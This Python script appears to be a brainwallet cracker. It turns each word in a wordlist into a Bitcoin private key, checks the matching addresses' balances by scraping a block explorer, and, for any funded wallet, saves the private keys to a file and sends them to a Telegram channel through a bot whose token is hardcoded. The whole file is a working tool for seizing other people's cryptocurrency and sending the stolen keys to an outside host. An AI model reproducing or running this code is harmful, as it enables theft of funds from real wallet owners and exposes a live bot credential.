import codecs, random, hashlib, ecdsa, sys, time
from time import sleep
from lxml import html
import secp256k1 as ice
import requests
from threading import Thread

def xBal(address):
    urlblock = "https://bitcoin.atomicwallet.io/address/" + address
    respone_block = requests.get(urlblock)
    byte_string = respone_block.content
    source_code = html.fromstring(byte_string)
    xpatch_txid = '/html/body/main/div/div[2]/div[1]/table/tbody/tr[3]/td[2]'
    treetxid = source_code.xpath(xpatch_txid)
    xVol = str(treetxid[0].text_content())
    return xVol

def xBal1(caddr):
    urlblock = "https://bitcoin.atomicwallet.io/address/" + caddr
    respone_block = requests.get(urlblock)
    byte_string = respone_block.content
    source_code = html.fromstring(byte_string)
    xpatch_txid = '/html/body/main/div/div[2]/div[1]/table/tbody/tr[3]/td[2]'
    treetxid = source_code.xpath(xpatch_txid)
    xVol1 = str(treetxid[0].text_content())
    return xVol1
def xRec(caddr):
    urlblock = "https://bitcoin.atomicwallet.io/address/" + caddr
    respone_block = requests.get(urlblock)
    byte_string = respone_block.content
    source_code = html.fromstring(byte_string)
    xpatch_txid = '/html/body/main/div/div[2]/div[1]/table/tbody/tr[4]/td[2]'
    treetxid = source_code.xpath(xpatch_txid)
    xVol1 = str(treetxid[0].text_content())
    return xVol1
def xRec(address):
    urlblock = "https://bitcoin.atomicwallet.io/address/" + address
    respone_block = requests.get(urlblock)
    byte_string = respone_block.content
    source_code = html.fromstring(byte_string)
    xpatch_txid = '/html/body/main/div/div[2]/div[1]/table/tbody/tr[4]/td[2]'
    treetxid = source_code.xpath(xpatch_txid)
    xVol1 = str(treetxid[0].text_content())
    return xVol1
class telegram:
    token = '5237275928:AAE_v3LMCBoNJSO-zeQPYBrqjOWxPGpaMvk'
    channel_id = '@maxgood11'
def send_telegram(text: str):
    try:
        requests.get('https://api.telegram.org/bot{}/sendMessage'.format(telegram.token), params=dict(
        chat_id=telegram.channel_id,
        text=text))
        print ("Send to telegram")
    except:
        print(f'Error send telegram.')
send_telegram("Начал {worker}")
#mylist = []
data = open('words.txt', "r", encoding="latin-1").readlines()
#with open('words.txt', newline='', encoding='utf-8') as f:
 #   for line in f:
 #       mylist.append(line.strip())

#mynumbers = []

#with open('numbers.txt', newline='', encoding='utf-8') as f:
#    for line in f:
#        mynumbers.append(line.strip())

    
class BrainWallet:

    @staticmethod
    def generate_address_from_passphrase(passphrase):
        private_key = str(hashlib.sha256(
            passphrase.encode('utf-8')).hexdigest())
        address =  BrainWallet.generate_address_from_private_key(private_key)
        return private_key, address

    @staticmethod
    def generate_address_from_private_key(private_key):
        public_key = BrainWallet.__private_to_public(private_key)
        address = BrainWallet.__public_to_address(public_key)
        return address

    @staticmethod
    def __private_to_public(private_key):
        private_key_bytes = codecs.decode(private_key, 'hex')
        key = ecdsa.SigningKey.from_string(
            private_key_bytes, curve=ecdsa.SECP256k1).verifying_key
        key_bytes = key.to_string()
        key_hex = codecs.encode(key_bytes, 'hex')
        bitcoin_byte = b'04'
        public_key = bitcoin_byte + key_hex
        return public_key

    @staticmethod
    def __public_to_address(public_key):
        public_key_bytes = codecs.decode(public_key, 'hex')
        # Run SHA256 for the public key
        sha256_bpk = hashlib.sha256(public_key_bytes)
        sha256_bpk_digest = sha256_bpk.digest()
        ripemd160_bpk = hashlib.new('ripemd160')
        ripemd160_bpk.update(sha256_bpk_digest)
        ripemd160_bpk_digest = ripemd160_bpk.digest()
        ripemd160_bpk_hex = codecs.encode(ripemd160_bpk_digest, 'hex')
        network_byte = b'00'
        network_bitcoin_public_key = network_byte + ripemd160_bpk_hex
        network_bitcoin_public_key_bytes = codecs.decode(
            network_bitcoin_public_key, 'hex')
        sha256_nbpk = hashlib.sha256(network_bitcoin_public_key_bytes)
        sha256_nbpk_digest = sha256_nbpk.digest()
        sha256_2_nbpk = hashlib.sha256(sha256_nbpk_digest)
        sha256_2_nbpk_digest = sha256_2_nbpk.digest()
        sha256_2_hex = codecs.encode(sha256_2_nbpk_digest, 'hex')
        checksum = sha256_2_hex[:8]
        address_hex = (network_bitcoin_public_key + checksum).decode('utf-8')
        wallet = BrainWallet.base58(address_hex)
        return wallet

    @staticmethod
    def base58(address_hex):
        alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
        b58_string = ''
        leading_zeros = len(address_hex) - len(address_hex.lstrip('0'))
        address_int = int(address_hex, 16)
        while address_int > 0:
            digit = address_int % 58
            digit_char = alphabet[digit]
            b58_string = digit_char + b58_string
            address_int //= 58
        ones = leading_zeros // 2
        for one in range(ones):
            b58_string = '1' + b58_string
        return b58_string

def divide(stuff):
    return [stuff[i::threadc] for i in range(threadc)]
threadc = int(input("Введи количество потоков: "))
def checker(data):
    count=0
    found=0
    for line in data:
        count+=1
        passphrase = str(line.replace("\n", ""))
        #passphrase = ' '.join(random.sample(mylist, random.randint(1,12)))
        #passphrase = ''.join(random.sample(mylist, random.randint(1,12))) # no space
        wallet = BrainWallet()
        private_key, address = wallet.generate_address_from_passphrase(passphrase)
        dec = int(private_key, 16)
        wifc = ice.btc_pvk_to_wif(private_key)
        wifu = ice.btc_pvk_to_wif(private_key, False)
        caddr = ice.privatekey_to_address(0, True, dec) #Compressed
        
        bal = xBal(address)
        bal1 = xBal1(caddr)
        #tr = xRec(address)
        #trr = xRec(caddr)
        ammount = '0 BTC'
        rec = '0'
        if bal != str(ammount) or bal1 != str(ammount):
            found+=1
            
            print('\nCongraz you have found Bitcoin Passphrase ')
            print('Passphrase : ',passphrase)
            #print('Bitcoin AddressUnCompressed : ', address, '        Balance = ' + bal, 'Recieved =' + tr)
            #print('Bitcoin AddressCompressed   : ', caddr, '        Balance = ' + bal1, 'Recieved =' + trr)
            print('Bitcoin AddressUnCompressed : ', address, '        Balance = ' + bal)
            print('Bitcoin AddressCompressed   : ', caddr, '        Balance = ' + bal1)
            print('Privatekey WIF UnCompressed : ', wifu)
            print('Privatekey WIF Compressed   : ', wifc)
            print('Privatekey HEX  : ',private_key)
            print('Privatekey DEC  : ', dec)
            text = (f"Bitcoin AddressUnCompressed : https://www.blockchain.com/btc/address/{address}\nBalance ={bal}\nBitcoin AddressCompressed: https://www.blockchain.com/btc/address/{caddr}\nBalance = {bal1}\nPrivatekey WIF UnCompressed : {wifu}\nPrivatekey WIF Compressed   :{wifc}\nPrivatekey HEX  : {private_key}")
            send_telegram(text)
            f=open(u"winner.txt","a")
            f.write('\nPassphrase       : '+ passphrase)
            f.write('\nBitcoin Address UnCompressed : ' + address + '  Balance = ' + str(bal))
            f.write('\nBitcoin Address Compressed : ' + caddr + '  Balance = ' + str(bal1))
            f.write('\nWIF UnCompressed       : '+ wifu)
            f.write('\nWIF Compressed         : '+ wifc)
            f.write('\nPrivate Key      : '+ private_key)
            f.close()
        else:
            print('Found: ', found, 'ScanNumber:  [' + str(count) + '] ','Passphrase : ', passphrase, end='\r')
    send_telegram("END")  
threads = []



for i in range(threadc):
    threads.append(Thread(target=checker,args=[divide(data)[i]]))
    threads[i].start()
for thread in threads:
    thread.join()